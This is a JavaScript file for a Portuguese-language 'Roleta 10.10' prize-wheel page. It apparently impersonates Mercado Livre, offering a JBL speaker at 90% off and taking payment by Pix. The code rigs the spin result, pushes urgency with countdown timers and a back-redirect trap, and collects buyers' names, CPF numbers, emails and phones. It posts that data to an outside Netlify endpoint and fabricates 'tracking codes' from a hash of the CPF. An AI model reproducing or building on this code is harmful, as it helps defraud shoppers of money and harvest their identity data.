        els.qrBox.innerHTML = `<img class="pixmodal__qrimg" src="${qrImg}" alt="QR Code Pix">`;

        // Botão copiar
        els.btnCopy.onclick = () => {
          navigator.clipboard.writeText(code).then(() => {
            els.btnCopy.textContent = 'Código copiado!';
            setTimeout(() => els.btnCopy.textContent = 'Copiar código Pix', 2000);
          });
        };

        // Inicia monitoramento de status
        pollStatus(res.transacao_id || res.transaction_id || res.id || res.txid);
      } else {
        const errorMsg = (res && (res.error || res.message || res.errorMessage)) || 'Falha ao gerar QR Code Pix';
        throw new Error(errorMsg);
      }
    } catch (err) {
      els.view_loading.hidden = true;
      els.view_confirm.hidden = false;
      if (handlers.onError) handlers.onError(err.message || 'Erro ao comunicar com a operadora do Pix');
    }
  }

  // Eventos de clique do modal
  els.close.onclick = () => close();
  els.backdrop.onclick = () => close();
  if (els.paidClose) els.paidClose.onclick = () => redirectToTracking();

  els.btnEdit.onclick = () => {
    els.view_confirm.hidden = true;
    els.view_form.hidden = false;
  };

  els.btnGenerate.onclick = () => {
    handleGenerate(buyerData || {});
  };

  els.btnForm.onclick = () => {
    const nome = els.fNome.value.trim();
    const cpf = els.fCpf.value.trim();
    const email = els.fEmail.value.trim();
    const fone = els.fFone.value.trim();
    if (!nome || !cpf) {
      if (handlers.onError) handlers.onError('Preencha seu nome e CPF');
      return;
    }
    buyerData = { nome, cpf, email, fone };
    try { localStorage.setItem('upsell_buyer', JSON.stringify(buyerData)); } catch (_) {}
    handleGenerate(buyerData);
  };

  // Simular pagamento (modo teste / fallback)
  if (els.btnSimulate) {
    els.btnSimulate.onclick = () => {
      onPaymentSuccess();
    };
  }

  function open(product) {
    clearInterval(pollInterval);
    pollInterval = null;
    isPaymentPaid = false;
    currentTrackingCode = '';
    currentProduct = product;
    els.sumImg.src = product.image;
    els.sumName.textContent = product.name;
    els.sumOld.textContent = 'R$ ' + product.oldPrice.toFixed(2).replace('.', ',');
    els.sumNew.textContent = 'R$ ' + product.price.toFixed(2).replace('.', ',');
    els.sumOff.textContent = product.off || '90% OFF';
    els.payTotal.textContent = 'R$ ' + product.price.toFixed(2).replace('.', ',');

    buyerData = loadBuyer();
    if (buyerData && buyerData.nome && buyerData.cpf) {
      els.buyerBox.hidden = false;
      els.buyerName.textContent = buyerData.nome;
      els.buyerDoc.textContent = buyerData.cpf;
      els.buyerMail.textContent = buyerData.email || 'contato do pedido';
      els.view_confirm.hidden = false;
      els.view_form.hidden = true;
    } else {
      els.buyerBox.hidden = true;
      els.view_confirm.hidden = true;
      els.view_form.hidden = false;
    }

    els.view_loading.hidden = true;
    els.view_qr.hidden = true;
    els.view_paid.hidden = true;

    els.modal.hidden = false;
    try {
      fbTrack('InitiateCheckout', {
        value: product.price,
        currency: 'BRL',
        content_name: product.name,
        content_type: 'product',
        content_ids: [product.id]
      });
      ttkTrack('InitiateCheckout', {
        value: product.price,
        currency: 'BRL',
        quantity: 1,
        content_id: product.id,
        content_name: product.name
      });
    } catch (_) {}
    requestAnimationFrame(() => els.modal.classList.add('is-open'));
  }

  function close() {
    clearInterval(pollInterval);
    pollInterval = null;
    if (isPaymentPaid) {
      redirectToTracking();
      return;
    }
    els.modal.classList.remove('is-open');
    setTimeout(() => els.modal.hidden = true, 300);
  }

  return { open, close };
}

function fbTrack(event, props) {
  if (typeof window.fbq === 'function') window.fbq('track', event, props);
}

function ttkTrack(event, props) {
  if (typeof window.ttkTrack === 'function') window.ttkTrack(event, props);
}

// --- 6. FLUXO PRINCIPAL DA APLICAÇÃO ---
const cfg = ROULETTE_CONFIG;
const { forcedWinner } = applyUrlOverrides(cfg);

const els = {
  app: $('#app'),
  screenGame: $('#screen-game'),
  screenStore: $('#screen-store'),
  banner: $('#banner'),
  customerNumber: $('#customer-number'),
  heroTimer: $('#offer-timer'),
  storeTimer: $('#store-timer'),
  couponPct: $('#coupon-pct'),
  btnSpin: $('#btn-spin'),
  spinHint: $('#spin-hint'),
  spinArea: $('.spin-area'),
  reel: $('#reel'),
  reelWindow: $('#reel-window'),
  reelStrip: $('#reel-strip'),
  stage: $('#stage'),
  stageLabel: $('#stage-label'),
  stageCount: $('#stage-count'),
  stageGap: $('#stage-gap'),
  stageHint: $('#stage-hint'),
  result: $('#result'),
  resultBox: $('#result-box'),
  resultPrize: $('#result-prize'),
  btnClaim: $('#btn-claim'),
  storeGrid: $('#store-grid'),
  confetti: $('#confetti'),
  toast: $('#toast'),
  btnSound: $('#btn-sound'),
  live: $('#live-region'),
  backModal: $('#backmodal')
};

const state = createStateMachine(STATES.READY, { debug: cfg.DEBUG });
const audio = createAudioEngine(cfg);
const reel = createReel({ windowEl: els.reelWindow, stripEl: els.reelStrip, cfg });
const countdown = createCountdown({ numberEl: els.stageCount });
const confetti = createConfetti(els.confetti, cfg);
const toast = createToast(els.toast);
const resultModal = createResult({
  overlayEl: els.result,
  boxEl: els.resultBox,
  prizeEl: els.resultPrize,
  ctaEl: els.btnClaim,
  cfg: { jackpotImage: JACKPOT.image, choiceMinutes: cfg.CHOICE_MINUTES }
});

let pixModal = null;
const store = createStore(els.storeGrid, prod => pixModal && pixModal.open(prod), cfg);
const backRedirect = createBackRedirect({
  modalEl: els.backModal,
  ctaEl: $('#back-cta'),
  closeEl: $('#back-close'),
  onStay: () => store.blinkHighlight(),
  canShow: () => $('#pixmodal').hidden
});

pixModal = createPixCheckout({
  modal: $('#pixmodal'),
  backdrop: $('#pix-backdrop'),
  close: $('#pix-close'),
  sumImg: $('#pix-sum-img'),
  sumName: $('#pix-sum-name'),
  sumOld: $('#pix-sum-old'),
  sumNew: $('#pix-sum-new'),
  sumOff: $('#pix-sum-off'),
  view_confirm: $('#pix-view-confirm'),
  view_form: $('#pix-view-form'),
  view_loading: $('#pix-view-loading'),
  view_qr: $('#pix-view-qr'),
  view_paid: $('#pix-view-paid'),
  buyerBox: $('#pix-buyer-box'),
  buyerName: $('#pix-buyer-name'),
  buyerDoc: $('#pix-buyer-doc'),
  buyerMail: $('#pix-buyer-mail'),
  btnEdit: $('#pix-edit'),
  payTotal: $('#pix-total'),
  btnGenerate: $('#pix-generate'),
  fNome: $('#pix-nome'),
  fCpf: $('#pix-cpf'),
  fEmail: $('#pix-email'),
  fFone: $('#pix-fone'),
  btnForm: $('#pix-form-submit'),
  qrBox: $('#pix-qr'),
  qrValue: $('#pix-qr-value'),
  pixCode: $('#pix-code'),
  btnCopy: $('#pix-copy'),
  demoRow: $('#pix-demo-row'),
  btnSimulate: $('#pix-simulate'),
  paidTitle: $('#pix-paid-title'),
  paidText: $('#pix-paid-text'),
  paidClose: $('#pix-paid-close'),
  comprov: $('#pix-comprov')
}, {
  onError: err => toast.show(err),
  onPaid: () => {
    backRedirect.disarm();
    confetti.burst({ count: 120, duration: 3500 });
  }
});

const guards = createGuards({
  isBusy: () => state.isBusy,
  onBack: () => toast.show('Calma! A roleta está girando — só mais alguns segundos.'),
  onResize: handleResize
});

function handleResize() {
  reel.relayout();
  confetti.resize();
  updateStageGap();
  if (!state.isBusy) {
    if (state.isDone && runData) {
      runData.target = calculateTargetPosition(runData.winnerIndex, reel.metrics, 0);
      reel.setPos(runData.target);
      return;
    }
    state.is(STATES.READY) ? resetReel() : reel.setPos(reel.centerOf(startIndexFor(reel.metrics)));
  }
}

const storage = {
  read() {
    try { return JSON.parse(sessionStorage.getItem(cfg.PERSIST_KEY) || 'null'); } catch (_) { return null; }
  },
  write(data) {
    try { sessionStorage.setItem(cfg.PERSIST_KEY, JSON.stringify(data)); } catch (_) {}
  }
};

let runData = null;
let spinRunner = null;
let isSpinningFlag = false;

state.onChange(s => {
  els.app.dataset.state = s;
});
els.app.dataset.state = state.current;

function updateSequence(seed, prize, winnerIdx) {
  reel.setSequence(generateRouletteSequence({
    products: PRODUCTS,
    jackpot: JACKPOT,
    length: cfg.REEL_LENGTH,
    winner: prize,
    winnerIndex: winnerIdx,
    rng: makeRng(seed ^ 2654435769)
  }));
}

function resetReel() {
  const startIdx = startIndexFor(reel.metrics);
  reel.setSequence(generateRouletteSequence({
    products: PRODUCTS,
    jackpot: JACKPOT,
    length: cfg.REEL_LENGTH,
    winner: JACKPOT,
    winnerIndex: startIdx + 1,
    rng: makeRng(randomSeed())
  }));
  reel.setPos(reel.centerOf(startIdx));
}

function updateStageGap() {
  if (!els.stageGap) return;
  const h = els.reel.getBoundingClientRect().height;
  if (h > 0) els.stageGap.style.height = h + 'px';
}

function openStage(label) {
  els.stage.hidden = false;
  els.stageLabel.textContent = label || 'PREPARE-SE';
  document.body.classList.add('no-scroll', 'is-stage');
  requestAnimationFrame(() => {
    els.stage.classList.add('is-open');
    reel.relayout();
    updateStageGap();
  });
}

function closeStage() {
  els.stage.classList.remove('is-open');
  document.body.classList.remove('is-stage', 'no-scroll');
  setTimeout(() => {
    if (!els.stage.classList.contains('is-open')) els.stage.hidden = true;
    reel.relayout();
    if (runData && state.isDone) {
      runData.target = calculateTargetPosition(runData.winnerIndex, reel.metrics, 0);
      reel.setPos(runData.target);
    }
  }, 320);
}

function switchScreen(screenName) {
  const isGame = screenName === 'game';
  els.screenGame.classList.toggle('is-active', isGame);
  els.screenStore.classList.toggle('is-active', !isGame);
  els.screenGame.hidden = !isGame;
  els.screenStore.hidden = isGame;
  window.scrollTo({ top: 0, behavior: 'auto' });
}

function claimPrizeAndOpenStore() {
  store.build();
  els.couponPct.textContent = (runData && runData.jackpotPercent ? runData.jackpotPercent : 90) + '%';
  resultModal.close();
  closeStage();
  switchScreen('store');
  resetTimer();
  backRedirect.arm();
  fbTrack('ViewContent', { content_name: 'Roleta 10.10 — prêmios liberados', value: 0 });
  ttkTrack('ViewContent', { value: 0, quantity: 1 });
}

function handleBannerClick() {
  if (state.isBusy || state.isDone) return;
  audio.unlock();
  audio.click();
  try {
    els.spinArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
  } catch (_) {
    els.spinArea.scrollIntoView();
  }
  restartAnimation(els.btnSpin, 'is-calling');
}

function startSpin() {
  if (isSpinningFlag || !state.is(STATES.READY)) return;
  isSpinningFlag = true;
  els.btnSpin.disabled = true;
  els.btnSpin.setAttribute('aria-disabled', 'true');
  els.btnSpin.classList.remove('is-calling');
  if (els.spinHint) els.spinHint.textContent = '';
  audio.unlock();
  guards.arm();
  openStage('PREPARE-SE');

  const seed = randomSeed();
  const rng = makeRng(seed);
  const selected = selectWinner({
    products: PRODUCTS,
    jackpot: { ref: JACKPOT, weight: cfg.JACKPOT.weight },
    weights: cfg.WEIGHTS,
    rng,
    forced: forcedWinner
  });

  runData = {
    seed,
    prize: selected.prize,
    jackpotPercent: selected.jackpotPercent,
    winnerIndex: 0,
    startIndex: 0,
    target: 0,
    applied: false
  };

  storage.write({
    stage: 'spinning',
    seed,
    winnerId: String(selected.prize.id),
    jackpotPercent: selected.jackpotPercent
  });

  state.set(STATES.COUNTDOWN);
  countdown.run({
    from: cfg.COUNTDOWN_FROM,
    step: cfg.COUNTDOWN_STEP,
    onNumber: n => audio.countdownBeep(n)
  }).then(ok => {
    if (ok) setTimeout(runSpinAnimation, cfg.PRE_SPIN_DELAY);
  });

  setTimeout(prepareReelGeometry, 360);
}

function prepareReelGeometry() {
  if (!runData || runData.applied) return;
  runData.applied = true;
  reel.relayout();
  const metrics = reel.metrics;
  runData.winnerIndex = winnerIndexFor(cfg.REEL_LENGTH, metrics);
  runData.startIndex = startIndexFor(metrics);
  updateSequence(runData.seed, runData.prize, runData.winnerIndex);
  reel.setPos(reel.centerOf(runData.startIndex));
  reel.freeze();
  runData.target = calculateTargetPosition(runData.winnerIndex, reel.metrics, cfg.LANDING_JITTER);
  updateStageGap();
}

function runSpinAnimation() {
  prepareReelGeometry();
  if (!state.set(STATES.SPINNING)) return;

  els.stageLabel.textContent = 'BOA SORTE';
  restartAnimation(els.stageLabel, 'stage__label--in');

  const lut = buildDistanceLUT(cfg.VELOCITY);
  const startPos = reel.centerOf(runData.startIndex);
  const totalDist = runData.target - startPos;
  let lastIndex = reel.indexAt(startPos);

  audio.startScore();
  spinRunner = createSpinRunner({
    from: startPos,
    to: runData.target,
    duration: cfg.SPIN_DURATION,
    lut,
    onFrame: (pos, progress, vel) => {
      reel.setPos(pos);
      const currIdx = reel.indexAt(pos);
      if (currIdx !== lastIndex) {
        lastIndex = currIdx;
        audio.tick(Math.max(0, (progress - 0.25) / 0.75));
      }
      audio.updateScore(progress, Math.abs(vel));
      if (progress >= cfg.FINISH_THRESHOLD && state.is(STATES.SPINNING)) {
        state.set(STATES.FINISHING);
        els.stageLabel.textContent = 'QUASE LÁ...';
      }
    },
    onFinish: finishSpin
  });

  spinRunner.start();
}

function finishSpin() {
  audio.land();
  audio.stopScore(600);
  reel.unfreeze();

  const isJp = !!runData.prize.isJackpot;
  reel.highlightWinner(runData.winnerIndex, isJp);
  els.stageLabel.textContent = isJp ? 'PRÊMIO MÁXIMO!' : 'É SEU!';
  restartAnimation(els.stageLabel, 'stage__label--hit');

  storage.write({
    stage: 'done',
    seed: runData.seed,
    winnerId: String(runData.prize.id),
    jackpotPercent: runData.jackpotPercent
  });

  setTimeout(() => showPrizeResult(isJp), isJp ? cfg.RESULT_DELAY_JACKPOT : cfg.RESULT_DELAY);
}

function showPrizeResult(isJp) {
  state.set(isJp ? STATES.JACKPOT : STATES.RESULT);
  guards.disarm();
  isSpinningFlag = false;

  if (isJp) {
    audio.jackpot();
    confetti.burst({ count: 200, duration: 6000 });
  } else {
    audio.win();
    confetti.burst();
  }

  resultModal.open({
    prize: runData.prize,
    jackpotPercent: runData.jackpotPercent,
    onClaimClick: claimPrizeAndOpenStore
  });
}

// --- 7. TIMER E PERSISTÊNCIA ---
const TIMER_KEY = 'roleta_choice_deadline_v3';
let deadline = 0;
let timerInterval = 0;

function pad(n) { return String(n).padStart(2, '0'); }

function updateTimer() {
  const left = Math.max(0, deadline - Date.now());
  const str = pad(Math.floor(left / 60000)) + ':' + pad(Math.floor((left % 60000) / 1000));
  if (els.heroTimer) els.heroTimer.textContent = str;
  if (els.storeTimer) els.storeTimer.textContent = str;
}

function initTimer() {
  try { deadline = Number(sessionStorage.getItem(TIMER_KEY)) || 0; } catch (_) {}
  if (!deadline || deadline < Date.now()) {
    deadline = Date.now() + cfg.CHOICE_MINUTES * 60000;
    try { sessionStorage.setItem(TIMER_KEY, String(deadline)); } catch (_) {}
  }
  updateTimer();
  if (!timerInterval) timerInterval = setInterval(updateTimer, 1000);
}

function resetTimer() {
  deadline = Date.now() + cfg.CHOICE_MINUTES * 60000;
  try { sessionStorage.setItem(TIMER_KEY, String(deadline)); } catch (_) {}
  updateTimer();
}

function openJblOrderModal(skipAdditionalPrize = false) {
  const modal = document.getElementById('jbl-order-modal');
  if (!modal) return;

  try {
    let segData = {};
    try { segData = JSON.parse(localStorage.getItem('mlSeguroData') || '{}'); } catch (_) {}
    let upsellBuyer = {};
    try { upsellBuyer = JSON.parse(localStorage.getItem('upsell_buyer') || sessionStorage.getItem('upsell_buyer') || '{}'); } catch (_) {}
    const cust = { ...segData, ...upsellBuyer };

    const rawCpf = (cust.cpf || cust.document || '').replace(/\D/g, '') || '11144477735';
    let cpfMap = {};
    try { cpfMap = JSON.parse(localStorage.getItem('ml_cpf_tracking_map') || '{}'); } catch (_) {}

    let trackingCode = cpfMap[rawCpf] || localStorage.getItem('ml_last_tracking_code');
    if (!trackingCode) {
      let hash = 0;
      for (let i = 0; i < rawCpf.length; i++) {
        hash = ((hash << 5) - hash) + rawCpf.charCodeAt(i);
        hash |= 0;
      }
      const numPart = Math.abs(hash % 900000000) + 100000000;
      trackingCode = `ML${numPart}BR`;
    }
    cpfMap[rawCpf] = trackingCode;
    try {
      localStorage.setItem('ml_cpf_tracking_map', JSON.stringify(cpfMap));
      localStorage.setItem('ml_last_tracking_code', trackingCode);
    } catch (_) {}

    let cartData = [];
    try { cartData = JSON.parse(localStorage.getItem('obrigado_cart') || '[]'); } catch (_) {}
    if (!Array.isArray(cartData) || cartData.length === 0) {
      cartData = [{
        type: 'main',
        name: "Caixa de Som Bluetooth À Prova D'água JBL Boombox 4 Branca 210W",
        price: 69.90,
        image: '/jbl/images/D_NQ_NP_629142-MLA91280310883_082025-F.webp'
      }];
    }

    let prizeData = null;
    if (!skipAdditionalPrize) {
      try { prizeData = JSON.parse(localStorage.getItem('ml_prize_won') || 'null'); } catch (_) {}
    } else {
      try { localStorage.removeItem('ml_prize_won'); } catch (_) {}
    }

    // Salva e sincroniza o registro de rastreio (somente com a compra já confirmada se não comprou prêmio adicional)
    let records = {};
    try { records = JSON.parse(localStorage.getItem('ml_tracking_records') || '{}'); } catch (_) {}
    const existing = records[trackingCode] || {};
    const trackingRecord = {
      code: trackingCode,
      createdAt: existing.createdAt || Date.now(),
      customer: cust,
      cart: cartData,
      prize: prizeData,
      mainProduct: {
        name: "Caixa de Som Bluetooth À Prova D'água JBL Boombox 4 Branca 210W",
        image: '/jbl/images/D_NQ_NP_629142-MLA91280310883_082025-F.webp',
        price: 69.90
      }
    };
    records[trackingCode] = trackingRecord;
    try { localStorage.setItem('ml_tracking_records', JSON.stringify(records)); } catch (_) {}

    try {
      const isLocalhost = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
      const apiBase = location.hostname.endsWith('github.io') ? 'https://mercadolivrepromocao11.netlify.app' : '';
          const postUrl = isLocalhost ? '/api/tracking' : (apiBase + '/.netlify/functions/tracking');
      fetch(postUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(trackingRecord)
      }).catch(() => {});
    } catch (_) {}

    // Popula UI do modal
    const orderNumEl = document.getElementById('jbl-modal-order-num');
    if (orderNumEl) orderNumEl.textContent = '#' + trackingCode.replace(/\D/g, '').slice(0, 8);

    const itemsListEl = document.getElementById('jbl-modal-items-list');
    if (itemsListEl) {
      let html = '';
      cartData.forEach(item => {
        const imgSrc = item.image
          ? (item.image.startsWith('http') || item.image.startsWith('/') ? item.image : '/jbl/' + item.image.replace(/^\.?\//, ''))
          : '/jbl/images/D_NQ_NP_629142-MLA91280310883_082025-F.webp';
        html += `
          <div class="pixpaid__item-row">
            <img src="${imgSrc}" alt="${item.name || 'JBL Boombox 4'}" class="pixpaid__item-img" onerror="this.src='/jbl/images/D_NQ_NP_629142-MLA91280310883_082025-F.webp'">
            <div class="pixpaid__item-meta">
              <strong>${item.name || 'Caixa de Som JBL Boombox 4'}</strong>
              <span>1x • ${item.type === 'bump' ? 'Oferta Adicional Confirmada' : 'Pedido Principal Confirmado'} • Frete Full</span>
            </div>
          </div>
        `;
      });
      if (prizeData && prizeData.name) {
        html += `
          <div class="pixpaid__item-row">
            <img src="${prizeData.image || prizeData.reelThumb || ''}" alt="${prizeData.name}" class="pixpaid__item-img">
            <div class="pixpaid__item-meta">
              <strong>${prizeData.name}</strong>
              <span class="pixpaid__tag-prize">🎁 Prêmio Roleta Vinculado</span>
            </div>
          </div>
        `;
      }
      itemsListEl.innerHTML = html;
    }

    const codeEl = document.getElementById('jbl-modal-tracking-code');
    if (codeEl) codeEl.textContent = trackingCode;

    const trackBtn = document.getElementById('jbl-modal-track-btn');
    if (trackBtn) trackBtn.href = `/promo/rastreio/?codigo=${encodeURIComponent(trackingCode)}`;
  } catch (err) {
    console.warn('Erro ao abrir modal do pedido JBL:', err);
  }

  modal.hidden = false;
  requestAnimationFrame(() => modal.classList.add('is-open'));
}

function closeJblOrderModal() {
  const modal = document.getElementById('jbl-order-modal');
  if (!modal) return;
  modal.classList.remove('is-open');
  setTimeout(() => { modal.hidden = true; }, 300);
}

function bindEvents() {
  els.btnSpin.addEventListener('click', startSpin);
  els.banner.addEventListener('click', handleBannerClick);
  const btnPaidClose = document.getElementById('pix-paid-close');
  if (btnPaidClose) {
    btnPaidClose.addEventListener('click', () => {
      const code = localStorage.getItem('ml_last_tracking_code') || '';
      window.location.href = code ? `/promo/rastreio/?codigo=${encodeURIComponent(code)}` : '/promo/rastreio/';
    });
  }

  const btnHdrDetails = document.getElementById('btn-hdr-details');
  if (btnHdrDetails) btnHdrDetails.addEventListener('click', () => openJblOrderModal(false));

  const btnSkipGame = document.getElementById('btn-skip-game');
  if (btnSkipGame) btnSkipGame.addEventListener('click', () => openJblOrderModal(true));

  const btnSkipStore = document.getElementById('btn-skip-store');
  if (btnSkipStore) btnSkipStore.addEventListener('click', () => openJblOrderModal(true));

  const btnSkipResult = document.getElementById('btn-skip-result');
  if (btnSkipResult) {
    btnSkipResult.addEventListener('click', () => {
      resultModal.close();
      closeStage();
      openJblOrderModal(true);
    });
  }

  const jblClose = document.getElementById('jbl-order-close');
  if (jblClose) jblClose.addEventListener('click', closeJblOrderModal);
  const jblBackdrop = document.getElementById('jbl-order-backdrop');
  if (jblBackdrop) jblBackdrop.addEventListener('click', closeJblOrderModal);
  const jblBackStore = document.getElementById('jbl-modal-back-store');
  if (jblBackStore) jblBackStore.addEventListener('click', closeJblOrderModal);

  els.btnSound.addEventListener('click', () => {
    const isM = audio.setMuted(!audio.muted);
    els.btnSound.dataset.muted = isM ? '1' : '0';
    els.btnSound.setAttribute('aria-label', isM ? 'Ativar som' : 'Desativar som');
    if (!isM) audio.unlock();
  });

  const unlockAudio = () => audio.unlock();
  window.addEventListener('pointerdown', unlockAudio, { once: true, passive: true });
  window.addEventListener('keydown', unlockAudio, { once: true });
  window.addEventListener('resize', handleResize);
}

async function init() {
  if (window._TESTE && $('#testbar')) {
    $('#testbar').hidden = false;
  }
  els.customerNumber.textContent = cfg.CUSTOMER_NUMBER;
  els.couponPct.textContent = '90%';
  bindEvents();
  initTimer();

  const saved = storage.read();
  if (saved && saved.stage === 'done' && saved.winnerId) {
    const prize = findPrize(saved.winnerId);
    runData = {
      seed: saved.seed,
      prize,
      jackpotPercent: saved.jackpotPercent || 90,
      winnerIndex: 0,
      startIndex: 0,
      target: 0,
      applied: true
    };
    state.force(prize.isJackpot ? STATES.JACKPOT : STATES.RESULT);
    store.build();
    els.couponPct.textContent = (saved.jackpotPercent || 90) + '%';
    switchScreen('store');
    backRedirect.arm();
    return;
  }

  switchScreen('game');
  reel.relayout();
  resetReel();
  updateStageGap();
  els.reel.classList.add('is-ready');
  preloadImages(allImages());
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init, { once: true });
} else {
  init();
}
